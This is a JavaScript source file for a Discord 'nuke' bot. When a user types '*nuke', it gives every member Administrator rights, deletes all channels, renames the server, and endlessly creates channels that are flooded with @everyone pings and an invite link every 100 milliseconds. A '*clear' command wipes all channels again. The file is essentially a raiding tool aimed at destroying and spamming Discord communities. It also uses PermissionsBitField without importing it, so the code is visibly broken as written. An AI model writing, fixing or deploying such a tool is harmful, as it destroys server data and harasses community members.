const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
require('dotenv').config();
const express = require('express');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const app = express();
const port = 3000;

app.get('/', (req, res) => {
  const imagePath = path.join(__dirname, 'index.html');
  res.sendFile(imagePath);
});

app.listen(port, () => {
  console.log('\x1b[36m[ SERVER ]\x1b[0m', '\x1b[32m SH : http://localhost:' + port + ' ✅\x1b[0m');
});

let nukeInterval; // To store the nuke process

client.once('ready', () => {
  console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mPing: ${client.ws.ping} ms \x1b[0m`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return; // Ignore bot messages

  if (message.content === '*nuke') {
    try {
      // Give @everyone admin permissions
      const everyoneRole = message.guild.roles.everyone;
      await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
      
      // Delete all existing channels
      const channels = message.guild.channels.cache;
      for (const [id, channel] of channels) {
        await channel.delete();
      }

      // Rename server
      await message.guild.setName('nuked by peeky and apex');

      // Function to create a new channel and start spamming
      const createAndSpamChannel = async () => {
        const channel = await message.guild.channels.create({
          name: 'nuked by peeky and apex',
          type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
        });

        // Spam messages in the new channel
        setInterval(() => {
          channel.send('@everyone @here https://discord.gg/jwYqu66bqm');
        }, 100); // Faster interval for spam (100 ms)
      };

      // Create the initial channel
      await createAndSpamChannel();

      // Infinite loop to continually create new channels and start spamming
      nukeInterval = setInterval(async () => {
        await createAndSpamChannel();
      }, 1000); // Faster interval for creating new channels (1000 ms)

    } catch (error) {
      console.error('Error during nuke operation:', error);
    }
  }

  if (message.content === '*stop') {
    try {
      // Stop the nuke process
      if (nukeInterval) {
        clearInterval(nukeInterval);
        nukeInterval = null; // Clear the interval reference
        message.channel.send('Nuke process stopped.');
      } else {
        message.channel.send('No nuke process is currently running.');
      }
    } catch (error) {
      console.error('Error during stop operation:', error);
    }
  }

  if (message.content === '*clear') {
    try {
      // Optionally, stop the nuke process if it is running
      if (nukeInterval) {
        clearInterval(nukeInterval);
        nukeInterval = null; // Clear the interval reference
        message.channel.send('Nuke process stopped.');
      }

      // Delete all channels
      const allChannels = message.guild.channels.cache;
      for (const [id, channel] of allChannels) {
        await channel.delete();
      }

      // Optionally, wait for a moment to ensure channels are deleted
      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second

      // Create a "general" channel after all channels are deleted
      await message.guild.channels.create({
        name: 'general',
        type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
      });

      message.channel.send('All channels have been deleted and a "general" channel has been created.');
    } catch (error) {
      console.error('Error during clear operation:', error);
    }
  }
});

async function login() {
  try {
    await client.login(process.env.TOKEN);
    console.log('\x1b[36m[ LOGIN ]\x1b[0m', `\x1b[32mLogged in as: ${client.user.tag} ✅\x1b[0m`);
    console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[35mBot ID: ${client.user.id} \x1b[0m`);
    console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mConnected to ${client.guilds.cache.size} server(s) \x1b[0m`);
  } catch (error) {
    console.error('\x1b[31m[ ERROR ]\x1b[0m', 'Failed to log in:', error);
    process.exit(1);
  }
}

login();
